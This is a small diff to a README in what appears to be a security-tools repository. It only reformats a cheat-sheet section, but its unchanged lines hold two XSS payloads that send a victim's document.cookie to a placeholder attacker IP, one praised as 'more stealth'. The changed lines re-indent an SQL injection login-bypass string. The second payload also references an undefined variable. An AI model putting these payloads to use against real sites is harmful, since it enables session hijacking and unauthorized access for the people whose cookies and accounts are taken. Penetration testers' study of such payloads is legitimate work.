@@ -30,12 +30,13 @@ This repository collects tools and methodologies used in the context of system s
 Not the best approach, generates a bunch of requests, very loud
 
     <img src="x" onerror=this.src='http://<attacker IP>:8000/'+document.cookie; />
+    
 More stealth, use this one
 
     <script>i=document.createElement('img');i.src='http://<attacker IP>:8000/'+document.cookie;document.body.appendChild(img)</script>
     
-###SQLI
-		a' OR 1=1 --
+###**SQLI**
+	a' OR 1=1 --
 
 		
 
